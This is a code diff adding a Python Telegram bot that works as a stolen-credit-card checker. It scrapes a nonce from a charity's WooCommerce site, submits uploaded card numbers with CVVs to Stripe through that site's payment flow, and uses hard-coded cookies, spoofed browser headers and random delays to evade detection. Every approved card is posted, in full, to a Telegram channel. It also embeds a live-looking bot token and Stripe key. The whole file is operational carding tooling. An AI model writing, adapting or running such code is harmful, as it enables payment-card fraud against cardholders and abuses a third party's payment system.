@@ -1,0 +1,661 @@
+import aiohttp
+import asyncio
+import json
+import random
+import os
+import sys
+from datetime import datetime
+from telegram import Update, Bot
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from dotenv import load_dotenv
+
+# ===================== CONFIGURATION =====================
+load_dotenv()
+
+DOMAIN = os.getenv("DOMAIN", "https://remember.org.au")
+PK = os.getenv("STRIPE_PK", "pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz")
+CHANNEL_ID = os.getenv("CHANNEL_ID", "-1003544706846")
+ADMIN_IDS = os.getenv("ADMIN_IDS", "1318826936").split(",") if os.getenv("ADMIN_IDS") else []
+
+# Global variables
+bot_running = True
+current_task = None
+approved_cards_list = []
+
+# ===================== HELPER FUNCTIONS =====================
+
+def safe_get(obj, key, default=None):
+    """Safely get value from object, handles non-dict objects"""
+    if isinstance(obj, dict):
+        return obj.get(key, default)
+    return default
+
+def parseX(data, start, end):
+    try:
+        star = data.index(start) + len(start)
+        last = data.index(end, star)
+        return data[star:last]
+    except ValueError:
+        return "None"
+
+async def make_request(
+    session,
+    url,
+    method="POST",
+    params=None,
+    headers=None,
+    data=None,
+    json_data=None,
+):
+    try:
+        async with session.request(
+            method,
+            url,
+            params=params,
+            headers=headers,
+            data=data,
+            json=json_data,
+        ) as response:
+            return await response.text(), response.status
+    except Exception as e:
+        return None, 0
+
+# ===================== ORIGINAL CARD CHECKING FUNCTIONS =====================
+
+async def ppc(card_data, card_num, total_cards, user_id=None, username=None):
+    """မူရင်း card checking function"""
+    # Declare global variable at the beginning of function
+    global approved_cards_list
+    
+    try:
+        cc, mon, year, cvv = card_data.split("|")
+    except ValueError:
+        return f"❌ [{card_num}/{total_cards}] Invalid card format"
+    
+    year = year[-2:]
+    cc = cc.replace(" ", "")
+    
+    original_card = f"{cc}|{mon}|{year}|{cvv}"
+    
+    cookies = {
+    '_ga': 'GA1.1.64190594.1765771546',
+    '__stripe_mid': 'df49f65f-66ae-4c15-ae1f-066de32ac1b5fe1eec',
+    'charitable_session': 'd56782e72300bc848281da8777d1b1f9||86400||82800',
+    '__stripe_sid': 'ea662ab1-7715-4f67-b2da-d556362188906bae18',
+    'PHPSESSID': 'eeb667ee345fac0062c0aa305f6784e7',
+    '_ga_Z0DZFYCN6Q': 'GS2.1.s1771826336$o6$g1$t1771826368$j28$l0$h0',
+}
+    connector = aiohttp.TCPConnector(limit=100, ssl=False)
+    timeout = aiohttp.ClientTimeout(total=30)
+    
+    async with aiohttp.ClientSession(
+        connector=connector,
+        timeout=timeout,
+        cookies=cookies
+    ) as session:
+
+        # Step 1: Get the payment method page
+        headers = {
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "priority": "u=0, i",
+            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "none",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+        }
+
+        req, status = await make_request(
+            session,
+            url=f"{DOMAIN}/my-account/add-payment-method/",
+            method="GET",
+            headers=headers,
+        )
+        
+        if req is None:
+            return f"❌ [{card_num}/{total_cards}] Failed to get payment method page"
+        
+        setup_intent_nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
+        if setup_intent_nonce == "None":
+            return f"❌ [{card_num}/{total_cards}] No setup intent nonce found"
+
+        await asyncio.sleep(random.uniform(2, 4))
+
+        # Step 2: Create payment method with Stripe
+        headers2 = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+        }
+
+        data2 = {
+            "type": "card",
+            "card[number]": cc,
+            "card[cvc]": cvv,
+            "card[exp_year]": year,
+            "card[exp_month]": mon,
+            "allow_redisplay": "unspecified",
+            "billing_details[address][postal_code]": "99501",
+            "billing_details[address][country]": "US",
+            "billing_details[name]": "Test User",
+            "pasted_fields": "number",
+            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
+            "referrer": DOMAIN,
+            "time_on_page": "187650",
+            "key": PK,
+            "_stripe_version": "2024-06-20",
+        }
+
+        req2, status2 = await make_request(
+            session,
+            "https://api.stripe.com/v1/payment_methods",
+            headers=headers2,
+            data=data2,
+        )
+        
+        if req2 is None:
+            return f"❌ [{card_num}/{total_cards}] Failed to create payment method"
+            
+        try:
+            pm_data = json.loads(req2)
+            # Use safe_get to handle possible non-dict responses
+            error_info = safe_get(pm_data, 'error')
+            if error_info:
+                error_message = safe_get(error_info, 'message', 'Unknown Stripe error')
+                return f"❌ [{card_num}/{total_cards}] Stripe error: {error_message}"
+            pmid = safe_get(pm_data, 'id')
+            if not pmid:
+                return f"❌ [{card_num}/{total_cards}] No payment method ID"
+        except json.JSONDecodeError:
+            return f"❌ [{card_num}/{total_cards}] Invalid JSON response from Stripe"
+        except Exception as e:
+            return f"❌ [{card_num}/{total_cards}] Error parsing Stripe response: {str(e)}"
+
+        await asyncio.sleep(random.uniform(1, 2))
+
+        # Step 3: Send to WooCommerce admin-ajax.php
+        headers3 = {
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": DOMAIN,
+            "referer": f"{DOMAIN}/my-account/add-payment-method/",
+            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+            "x-requested-with": "XMLHttpRequest",
+        }
+
+        data3 = {
+            "action": "wc_stripe_create_and_confirm_setup_intent",
+            "wc-stripe-payment-method": pmid,
+            "wc-stripe-payment-type": "card",
+            "_ajax_nonce": setup_intent_nonce,
+        }
+
+        req3, status3 = await make_request(
+            session,
+            url=f"{DOMAIN}/wp-admin/admin-ajax.php",
+            headers=headers3,
+            data=data3,
+        )
+        
+        if req3:
+            try:
+                result_data = json.loads(req3)
+                
+                # 🔴 FIXED: Check if result_data is a dictionary before using .get()
+                if isinstance(result_data, dict):
+                    success = safe_get(result_data, 'success', False)
+                    
+                    if success:
+                        result_message = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
+                        
+                        # ✅ Store approved card for channel posting
+                        card_info = {
+                            "card": original_card,
+                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                            "user_id": user_id,
+                            "username": username,
+                            "card_num": card_num,
+                            "total_cards": total_cards
+                        }
+                        
+                        # Add to approved cards list - already declared global
+                        approved_cards_list.append(card_info)
+                        
+                        return result_message
+                    else:
+                        error_msg = "Unknown error"
+                        try:
+                            # Use safe_get to safely access nested data
+                            data_part = safe_get(result_data, 'data')
+                            if isinstance(data_part, dict):
+                                error_info = safe_get(data_part, 'error')
+                                if isinstance(error_info, dict):
+                                    error_msg = safe_get(error_info, 'message', 'No error message')
+                            
+                            if error_msg == "Unknown error":
+                                error_msg = safe_get(result_data, 'message', 'No message')
+                        except Exception as e:
+                            error_msg = f"Error parsing error message: {str(e)}"
+                        
+                        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
+                
+                elif isinstance(result_data, (int, float, str, bool)):
+                    # Handle cases where result_data is a simple value (e.g., 0, 1, true, false)
+                    result_str = str(result_data).lower()
+                    if result_str in ['1', 'true', 'success']:
+                        result_message = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
+                        
+                        card_info = {
+                            "card": original_card,
+                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                            "user_id": user_id,
+                            "username": username,
+                            "card_num": card_num,
+                            "total_cards": total_cards
+                        }
+                        
+                        # Add to approved cards list - already declared global
+                        approved_cards_list.append(card_info)
+                        
+                        return result_message
+                    else:
+                        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result_data}"
+                
+                else:
+                    # result_data is neither dict nor simple type
+                    return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗨𝗻𝗲𝘅𝗽𝗲𝗰𝘁𝗲𝗱 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝘁𝘆𝗽𝗲: {type(result_data).__name__}"
+            
+            except json.JSONDecodeError:
+                # Response is not valid JSON
+                return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 (non-JSON): {req3[:100]}..."
+            
+            except Exception as e:
+                return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗲𝗿𝗿𝗼𝗿: {str(e)}"
+        
+        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗡𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗳𝗿𝗼𝗺 𝘀𝗲𝗿𝘃𝗲𝗿"
+
+# ===================== CHANNEL POSTING FUNCTIONS =====================
+
+async def post_to_channel(bot: Bot, card_info):
+    """Post approved card to Telegram channel"""
+    try:
+        message = (
+            f"🎉 **NEW APPROVED CARD** 🎉\n\n"
+            f"💳 `{card_info['card']}`\n"
+            f"⏰ {card_info['timestamp']}\n"
+            f"📊 Progress: {card_info['card_num']}/{card_info['total_cards']}\n"
+        )
+        
+        if card_info.get('username'):
+            message += f"👤 Checked by: @{card_info['username']}"
+        
+        await bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=message,
+            parse_mode="Markdown"
+        )
+        print(f"✅ Approved card posted to channel: {card_info['card']}")
+        return True
+    except Exception as e:
+        print(f"❌ Failed to post to channel: {e}")
+        return False
+
+async def post_batch_to_channel(bot: Bot, cards_batch, batch_number):
+    """Post multiple approved cards as a batch"""
+    try:
+        if not cards_batch:
+            return False
+        
+        batch_message = f"📦 **BATCH #{batch_number} - APPROVED CARDS**\n\n"
+        
+        for i, card_info in enumerate(cards_batch, 1):
+            batch_message += f"{i}. `{card_info['card']}`\n"
+            batch_message += f"   ⏰ {card_info['timestamp']}\n"
+            if card_info.get('username'):
+                batch_message += f"   👤 @{card_info['username']}\n"
+            batch_message += "\n"
+        
+        batch_message += f"✅ Total: {len(cards_batch)} cards"
+        
+        await bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=batch_message,
+            parse_mode="Markdown"
+        )
+        print(f"✅ Batch #{batch_number} posted to channel with {len(cards_batch)} cards")
+        return True
+    except Exception as e:
+        print(f"❌ Failed to post batch to channel: {e}")
+        return False
+
+async def check_and_post_approved_cards(bot: Bot):
+    """Check and post approved cards to channel"""
+    global approved_cards_list
+    
+    if not approved_cards_list:
+        return 0
+    
+    posted_count = 0
+    temp_list = approved_cards_list.copy()
+    
+    for card_info in temp_list:
+        try:
+            if await post_to_channel(bot, card_info):
+                posted_count += 1
+                approved_cards_list.remove(card_info)
+                await asyncio.sleep(1)
+        except Exception as e:
+            print(f"Error posting card: {e}")
+    
+    return posted_count
+
+# ===================== TELEGRAM BOT FUNCTIONS =====================
+
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /start command"""
+    global bot_running
+    bot_running = True
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username or "N/A"
+    
+    welcome_text = (
+        f"🔄 Credit Card Checker Bot\n"
+        f"👤 User: @{username}\n\n"
+        f"📁 Send .txt file with format:\n"
+        f"card|month|year|cvv\n\n"
+        f"Example:\n4111111111111111|12|2026|123\n\n"
+        f"🔸 **Commands:**\n"
+        f"/start - Start bot\n"
+        f"/stop - Stop checking\n"
+        f"/status - Check status\n"
+        f"/postnow - Post approved cards to channel (Admin only)\n\n"
+        f"✅ Approved cards auto-posted to channel."
+    )
+    await update.message.reply_text(welcome_text)
+    
+    print(f"👤 User @{username} (ID: {user_id}) started bot")
+
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /stop command"""
+    global bot_running, current_task
+    
+    if not bot_running:
+        await update.message.reply_text("⚠️ Bot is not running.")
+        return
+    
+    bot_running = False
+    
+    if current_task and not current_task.done():
+        current_task.cancel()
+        try:
+            await current_task
+        except asyncio.CancelledError:
+            pass
+    
+    await update.message.reply_text("🛑 **Checking stopped!**\nUse /start to restart.")
+    print("🛑 User requested stop via /stop command")
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /status command"""
+    global bot_running, approved_cards_list
+    
+    status_text = "🟢 Bot running" if bot_running else "🔴 Bot stopped"
+    
+    status_message = (
+        f"📊 **Bot Status**\n"
+        f"{status_text}\n"
+        f"📈 Approved cards waiting: {len(approved_cards_list)}\n\n"
+        f"🔸 **Commands:**\n"
+        f"/start - Start bot\n"
+        f"/stop - Stop checking\n"
+        f"/status - This page\n"
+        f"/postnow - Post to channel (Admin)"
+    )
+    
+    await update.message.reply_text(status_message)
+
+async def postnow_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /postnow command"""
+    user_id = str(update.effective_user.id)
+    
+    # Check admin access - use safe_get approach for context.bot_data if needed
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    global approved_cards_list
+    
+    if not approved_cards_list:
+        await update.message.reply_text("ℹ️ No approved cards to post.")
+        return
+    
+    await update.message.reply_text(f"📤 Posting {len(approved_cards_list)} cards to channel...")
+    
+    posted_count = 0
+    bot = context.bot
+    
+    # Post in batches of 5
+    for i in range(0, len(approved_cards_list), 5):
+        batch = approved_cards_list[i:i+5]
+        if await post_batch_to_channel(bot, batch, i//5 + 1):
+            posted_count += len(batch)
+        await asyncio.sleep(1)
+    
+    # Clear list
+    approved_cards_list = []
+    
+    await update.message.reply_text(f"✅ {posted_count} cards posted to channel.")
+
+async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle incoming text files"""
+    global bot_running, current_task, approved_cards_list
+    
+    if not bot_running:
+        await update.message.reply_text("⚠️ Bot stopped. Use /start to restart.")
+        return
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username or "N/A"
+    
+    document = update.message.document
+    
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Send .txt file only")
+        return
+    
+    await update.message.reply_text("📥 File received, checking...")
+    
+    # Download file
+    file = await document.get_file()
+    temp_file = f"temp_{user_id}_{document.file_name}"
+    await file.download_to_drive(temp_file)
+    
+    try:
+        with open(temp_file, 'r', encoding='utf-8') as f:
+            cards = [line.strip() for line in f if line.strip()]
+        
+        if not cards:
+            await update.message.reply_text("❌ Empty or invalid file")
+            return
+        
+        total_cards = len(cards)
+        await update.message.reply_text(
+            f"🔍 **Checking Started**\n"
+            f"👤 User: @{username}\n"
+            f"📊 Cards: {total_cards}\n"
+            f"✅ Approved cards auto-posted to channel.\n\n"
+            f"🛑 Stop with /stop"
+        )
+        
+        approved = 0
+        declined = 0
+        results = []
+        checked_cards = 0
+        
+        bot_instance = context.bot
+        
+        for i, card in enumerate(cards, 1):
+            if not bot_running:
+                await update.message.reply_text(
+                    f"🛑 **Stopped!**\n"
+                    f"Checked: {checked_cards}/{total_cards}\n"
+                    f"✅ Approved: {approved}\n"
+                    f"❌ Declined: {declined}"
+                )
+                break
+            
+            try:
+                current_task = asyncio.create_task(ppc(card, i, total_cards, user_id, username))
+                result = await current_task
+                
+                results.append(result)
+                checked_cards = i
+                
+                if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥" in result:
+                    approved += 1
+                    
+                    # Post approved card to channel
+                    if approved_cards_list:
+                        last_card = approved_cards_list[-1]
+                        if await post_to_channel(bot_instance, last_card):
+                            approved_cards_list.remove(last_card)
+                else:
+                    declined += 1
+                
+            except asyncio.CancelledError:
+                await update.message.reply_text("🛑 Checking cancelled")
+                break
+            except Exception as e:
+                error_result = f"❌ Error [{i}/{total_cards}]\nCard: {card}\nError: {str(e)}"
+                results.append(error_result)
+                declined += 1
+                checked_cards = i
+            
+            # Progress update
+            if i % 5 == 0 or i == total_cards:
+                progress_msg = (
+                    f"📊 **Progress:** {i}/{total_cards}\n"
+                    f"✅ Approved: {approved} | ❌ Declined: {declined}"
+                )
+                await update.message.reply_text(progress_msg)
+                
+                # Send last 3 results
+                if results:
+                    await update.message.reply_text('\n'.join(results[-3:]))
+            
+            # Delay between cards
+            if i < total_cards and bot_running:
+                delay = random.uniform(10, 15)
+                for _ in range(int(delay)):
+                    if not bot_running:
+                        break
+                    await asyncio.sleep(1)
+        
+        # Final summary if not stopped
+        if bot_running:
+            success_rate = 0
+            if total_cards > 0:
+                success_rate = (approved / total_cards) * 100
+            
+            summary = [
+                "🎯 **Check Completed**",
+                f"📊 Total: {total_cards}",
+                f"✅ Approved: {approved}",
+                f"❌ Declined: {declined}",
+                f"📈 Success rate: {success_rate:.1f}%",
+                "",
+                f"✅ Approved cards posted to channel."
+            ]
+            await update.message.reply_text('\n'.join(summary))
+        
+        # Post any remaining approved cards
+        if approved_cards_list:
+            remaining_count = len(approved_cards_list)
+            await update.message.reply_text(
+                f"📤 Posting {remaining_count} approved cards to channel..."
+            )
+            posted = await check_and_post_approved_cards(bot_instance)
+            if posted > 0:
+                await update.message.reply_text(
+                    f"✅ {posted} cards posted to channel."
+                )
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+        print(f"Error in handle_text_file: {e}")
+    finally:
+        # Cleanup
+        try:
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+        except Exception as e:
+            print(f"Error removing temp file: {e}")
+        
+        current_task = None
+
+# ===================== MAIN FUNCTION =====================
+
+def main():
+    """Main function for Render hosting"""
+    # Get configuration
+    BOT_TOKEN = "8785767340:AAGAnLPeIq-Eb9bb32At0E4d4sAIyiqQXjg"
+    
+    if not BOT_TOKEN:
+        print("❌ Error: BOT_TOKEN not set in environment!")
+        print("Please set BOT_TOKEN in Render environment variables")
+        return
+    
+    # Check channel config
+    if CHANNEL_ID == "@your_channel_username":
+        print("⚠️ Warning: CHANNEL_ID not configured")
+    
+    print(f"🤖 Starting Telegram Bot...")
+    print(f"📢 Channel: {CHANNEL_ID}")
+    print(f"👑 Admin IDs: {ADMIN_IDS}")
+    print("=" * 40)
+    
+    try:
+        # Create application
+        app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Add handlers
+        app.add_handler(CommandHandler("start", start_command))
+        app.add_handler(CommandHandler("stop", stop_command))
+        app.add_handler(CommandHandler("status", status_command))
+        app.add_handler(CommandHandler("postnow", postnow_command))
+        app.add_handler(MessageHandler(filters.Document.ALL, handle_text_file))
+        
+        # Start bot
+        print("✅ Bot is running...")
+        print("📋 Available commands:")
+        print("  /start    - Start the bot")
+        print("  /stop     - Stop current checking")
+        print("  /status   - Check bot status")
+        print("  /postnow  - Post approved cards to channel")
+        print("=" * 40)
+        
+        app.run_polling()
+        
+    except Exception as e:
+        print(f"❌ Bot error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
